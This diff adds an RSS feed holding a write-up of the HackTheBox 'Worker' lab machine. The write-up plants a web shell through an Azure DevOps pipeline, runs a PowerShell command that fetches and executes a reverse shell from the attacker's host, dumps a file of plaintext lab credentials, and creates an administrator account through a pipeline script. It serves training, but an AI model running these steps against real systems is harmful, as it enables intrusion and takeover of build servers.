@@ -1,0 +1,404 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Azure-DevOps on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/azure-devops/</link>
+    <description>Recent content in Azure-DevOps on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 03 May 2021 17:01:02 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/azure-devops/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Worker</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
+      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
+      <description>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps.</description>
+      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>SVN enumeration</li>
+<li>Windows enumeration</li>
+<li>Exploiting Azure Pipelines</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>svn cli client - Preinstalled in Kali Linux</li>
+<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19» 
+$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
+<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
+Nmap scan report <span style="color:#66d9ef">for</span> dimension.worker.htb <span style="color:#f92672">(</span>10.10.10.203<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+3690/tcp open  svnserve Subversion
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
+$ nmap -p53,445,389,5985 10.10.10.203
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-31 13:34 EST
+Host is up <span style="color:#f92672">(</span>0.013s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE     SERVICE
+<span style="color:#ae81ff">53</span>       filtered  domain
+<span style="color:#ae81ff">389</span>      filtered  ldap
+<span style="color:#ae81ff">445</span>      filtered  microsoft-ds
+<span style="color:#ae81ff">5985</span>     open      wsman
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting the port 80 displays the IIS default page.</p>
+<p><div class="img-container"><img src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  /></div>
+</p>
+<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
+<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
+<p>The general usage as follows:</p>
+<pre><code>svn &lt;sub-command&gt; svn://[ip]
+</code></pre><ul>
+<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
+</ul>
+<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
+$ svn ls svn://10.10.10.203
+dimension.worker.htb/
+moved.txt
+</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
+$ svn cat svn://10.10.10.203/moved.txt
+This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :<span style="color:#f92672">)</span>
+</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
+$ svn info svn://10.10.10.203
+Path: .
+URL: svn://10.10.10.203
+Relative URL: ^/
+Repository Root: svn://10.10.10.203
+Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
+Revision: <span style="color:#ae81ff">5</span>
+Node Kind: directory
+Last Changed Author: nathen
+Last Changed Rev: <span style="color:#ae81ff">5</span>
+Last Changed Date: 2020-06-20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span>
+</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
+$ svn log svn://10.10.10.203
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+r5 | nathen | 2020–06–20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
+Added note that repo has been migrated
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+r4 | nathen | 2020–06–20 09:50:20 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
+Moving this repo to our new devops server which will handle the deployment <span style="color:#66d9ef">for</span> us
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+r3 | nathen | 2020–06–20 09:46:19 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
+-
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+r2 | nathen | 2020–06–20 09:45:16 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
+Added deployment script
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+r1 | nathen | 2020–06–20 09:43:43 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
+First version
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
+<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
+$ svn diff -r 1:2 svn://10.10.10.203/
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  /></div>
+</p>
+<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
+<ul>
+<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
+<li>A set of credentials: <code>nathen:wendel98</code></li>
+</ul>
+<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
+</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
+<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
+<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  /></div>
+</p>
+<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  /></div>
+</p>
+<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
+<ul>
+<li><code>alpha.worker.htb</code></li>
+<li><code>cartoon.worker.htb</code></li>
+<li><code>lens.worker.htb</code></li>
+<li><code>solid-state.worker.htb</code></li>
+<li><code>spectral.worker.htb</code></li>
+<li><code>story.worker.htb</code></li>
+</ul>
+<p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
+<h4 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h4>
+<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  /></div>
+</p>
+<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  /></div>
+</p>
+<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
+<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  /></div>
+</p>
+<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  /></div>
+</p>
+<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
+<p><div class="img-container"><img src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  /></div>
+</p>
+<p>From there, I try to lookup into the project&rsquo;s repository.</p>
+<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  /></div>
+</p>
+<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
+<blockquote>
+<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
+</blockquote>
+<p><div class="img-container"><img src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  /></div>
+</p>
+<p>User <code>nathen</code> is allowed to queue a builds.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  /></div>
+</p>
+<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
+<h4 id="webshell-upload">Webshell Upload</h4>
+<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
+<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  /></div>
+</p>
+<p>I&rsquo;ll pick any available work items.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  /></div>
+</p>
+<p>I can just drag and drop the web shell, and commit it afterwards.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  /></div>
+</p>
+<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
+<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  /></div>
+</p>
+<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
+<p><div class="img-container"><img src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  /></div>
+</p>
+<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  /></div>
+</p>
+<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe <span style="color:#e6db74">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
+</code></pre></div><p>I have a shell now on my listener.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-robisl">Shell as robisl</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  /></div>
+</p>
+<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
+<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
+<p><div class="img-container"><img src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  /></div>
+</p>
+<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\Users&gt; net user robisl
+User name                    robisl
+Full Name                    Robin Islip
+Comment                      
+User’s comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-04-05 21:27:26
+Password expires             Never
+Password changeable          2020-04-05 21:27:26
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2020-08-18 18:28:36
+
+Logon hours allowed          All
+
+Local Group Memberships      *Production           *Remote 
+Global Group memberships     *None                 
+The command completed successfully.
+</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
+<pre><code>PS C:\users\&gt;net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share
+IPC$                                         Remote IPC
+W$           W:\                             Default share
+ADMIN$       C:\Windows                      Remote Admin
+The command completed successfully.
+</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
+<pre><code>PS W:\&gt; dir
+
+
+    Directory: W:\
+
+
+Mode                LastWriteTime         Length Name                                                             
+----                -------------         ------ ----                                                             
+d-----       2020-06-16     18:59                agents                                                          
+d-----       2020-03-28     15:57                AzureDevOpsData                                                
+d-----       2020-04-03     11:31                sites                                                          
+d-----       2020-06-20     16:04                svnrepos
+</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command&gt;</code> keyword.</p>
+<pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
+</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p>
+<pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
+</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p>
+<p><div class="img-container"><img src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  /></div>
+</p>
+<p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p>
+<pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
+### This file is an example password file for svnserve.
+### Its format is similar to that of svnserve.conf. As shown in the
+### example below it contains one section labelled [users].
+### The name and password for each user follow, one account per line.
+
+[users]
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+</code></pre><h4 id="remote-access---robisl">Remote Access - robisl</h4>
+<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
+$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+worker<span style="color:#ae81ff">\r</span>obisl
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../Desktop
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop&gt; dir
+
+
+    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/29/2020   3:37 PM             <span style="color:#ae81ff">34</span> user.txt
+</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
+<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
+<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  /></div>
+</p>
+<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  /></div>
+</p>
+<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
+<p><div class="img-container"><img src="imgs/image-20210504010111041.png" alt=""  /></div>
+</p>
+<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
+<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  /></div>
+</p>
+<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  /></div>
+</p>
+<p>So, let’s execute the plan!</p>
+<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
+<p><div class="img-container"><img src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  /></div>
+</p>
+<p>In the next section, I’ll choose Azure Repos Git.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  /></div>
+</p>
+<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  /></div>
+</p>
+<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  /></div>
+</p>
+<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
+<p>I’ll save it and run it on a new branch.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  /></div>
+</p>
+<p>I’ll just wait for the output log.</p>
+<p><div class="img-container"><img src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  /></div>
+</p>
+<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
+<p><div class="img-container"><img src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  /></div>
+</p>
+<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
+<p>I can also create a privileged user using multi-line script.</p>
+<pre><code>- script: | 
+net user iamf YourComplexPassword /add /domain
+net localgroup Administrators iamf /add 
+net localgroup &quot;Remote Management Users&quot; iamf /add 
+displayName: &quot;Set IamF to Admin&quot;
+</code></pre><p>I can push it again and wait for it to complete.</p>
+<p><div class="img-container"><img src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  /></div>
+</p>
+<p>Now I can login with the newly created user.</p>
+<p><div class="img-container"><img src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  /></div>
+</p>
+<hr>
+<p>References:</p>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
+<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
+<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
